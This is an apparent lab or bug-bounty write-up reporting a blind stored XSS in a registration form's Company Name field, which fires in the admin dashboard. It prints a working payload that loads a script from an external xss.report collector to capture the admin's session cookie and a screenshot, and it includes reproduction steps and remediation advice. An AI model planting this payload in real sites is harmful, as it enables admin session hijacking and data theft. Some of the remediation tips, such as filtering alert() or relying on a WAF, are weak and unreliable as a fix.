---
## Title
Blind Cross-Site Scripting (XSS) via Company Name Field in Registration

---
## Vulnerability Type
Blind XSS

---
## Summary
I identified a blind XSS in the **company Name Feild** during user registration. The feild accepts and stores raw HTML without any sanitization. The payload does not executes on the user side - it fires silently in the admin panel when an admin views the registered users list.This was confirmed via XSS report which captured a screenshot of the admin panel where the payload executed.

---
## Vulnerable Endpoint
```
https://kzlabs.com/63.php?view=register
```
---
## Steps to Reproduce
1. Register a new account in the following URL
```
 https://kzlabs.com/63.php?view=register
```
3. In the **Company Name** field enter the following blind XSS payload:
```
'"><script src=https://xss.report/c/tali></script>
```
3. Complete registration and log in.
5. Navigate to **My Profile** and the Company field shows `'">` confirming the payload was stored as-is but the script tag portion loaded silently in the background.
6. Wait for the admin to log in and open the admin dashboard.
7. Once the admin visits the dashboard the payload fires on their end and the XSS reporting tool at `xss.report` captures the execution along with a screenshot of what the admin viwed.
8. The XSS report dashboard captured a screenshot of the admin panel confirming execution

---
## Payload Used
```
'"><script src=https://xss.report/c/tali></script>
```

---
## Proof of Concept

**Screenshot 1** — Registration form showing the blind XSS payload entered in the Company Name field, with the app itself warning "This field accepts any input including HTML content" confirming the field accepts raw HTML with no filtering at all.

<img width="755" height="932" alt="Capture63" src="https://github.com/user-attachments/assets/b8e1ce2d-a0f9-41c0-801e-a364979a722f" />



**Screenshot 2** — My Profile page showing the Company field rendering `'">` confirming the payload was stored as-is, the script tag portion loaded silently in the background.

<img width="740" height="719" alt="lab63" src="https://github.com/user-attachments/assets/532ac978-8f1a-4b6c-a9f6-1725bdc9769d" />


**Screenshot 3** — Admin dashboard showing the Recent Registrations table with the attacker's account (smith) and the stored payload visible in the Company column as `'">`, confirming the admin's browser loaded and executed the external script when the dashboard was opened.

<img width="1311" height="747" alt="Capture 6363" src="https://github.com/user-attachments/assets/12b8fa63-b37b-4b8f-9a29-b99188f95c40" />


**Screenshot 4** — XSS reporting tool at xss.report showing the screenshot preview captured from the admin's browser session when the payload fired, confirming blind XSS execution on the admin side with the session cookie `5898fb3750074f1ce30274df` visible in the top right corner.

<img width="1222" height="759" alt="Capture636363" src="https://github.com/user-attachments/assets/5e15f718-d202-4060-97d0-d2bd11d75931" />



---
## Impact
- The payload executes silently in the admin browser with zero interaction-just by opening the dashboard and viewing recent registrations 
- Admin session cookie is exposed - attacker can take over the admin account completly with no password needed.
- Since the admin has full access to manage all registered users a compromised admin account means full control over the entire platform
- The attacker also gets a screenshot of exactly what the admin sees leaking sensitive internal data like user emails, registration details and platform stats
- The victim admin has no isea anything happened - the page look completely normal.

---
## Remediation
1. Filter out dangerous HTML tags like `<script>`, `<img>`, `<svg>` from the Company Name field before saving anything to the database
2. Filter out JavaScript methods like `alert()`, `confirm()`, `prompt()` and block external script sources from being injected through input fields
3. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
4. Implement a strict **Content Security Policy (CSP)** header that blocks loading of external scripts as this would have directly prevented the `xss.report` script from loading even if the payload got stored
5. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
